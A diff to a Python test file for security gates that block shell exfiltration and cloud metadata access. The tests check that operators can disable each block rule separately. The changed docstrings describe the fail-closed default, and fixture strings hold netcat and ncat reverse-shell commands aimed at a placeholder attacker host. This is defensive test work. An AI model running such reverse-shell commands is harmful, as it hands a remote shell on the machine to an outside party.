@@ -1,9 +1,8 @@
 """The always-on exfil / IMDS gates now honour a per-rule operator opt-out.
 
-``audit_bash_exfiltration`` and ``_check_imds_access`` used to consult no state at
-all: they were keyed to no rule id, so nothing in Settings could switch them off
-and a denial mapped back to no rule in the audit trail. Each branch now carries
-the id of the catalog rule it enforces.
+``audit_bash_exfiltration`` and ``_check_imds_access`` each carry the id of the
+catalog rule they enforce. Keyed to no rule id, nothing in Settings can switch
+them off and a denial maps back to no rule in the audit trail.
 
 Pinned here: the fail-closed default (``enabled_ids=None`` means all enabled, so
 the callers that hold no effective set keep full strength); that disabling a rule
@@ -92,8 +91,7 @@ def test_one_regex_spanning_two_rows_honours_each_row_separately() -> None:
 
     Denying while EITHER row was enabled defeated the operator: switching
     `reverse-shell-nc` off left a plain `nc -e` blocked by the ncat row, so the
-    toggle read as enabled-and-off while enforcement never changed. GPT 5.6 flagged
-    it on #7705.
+    toggle read as enabled-and-off while enforcement never changed.
     """
     nc_cmd = "nc -e /bin/sh evil.test 443"
     ncat_cmd = "ncat -e /bin/sh evil.test 443"
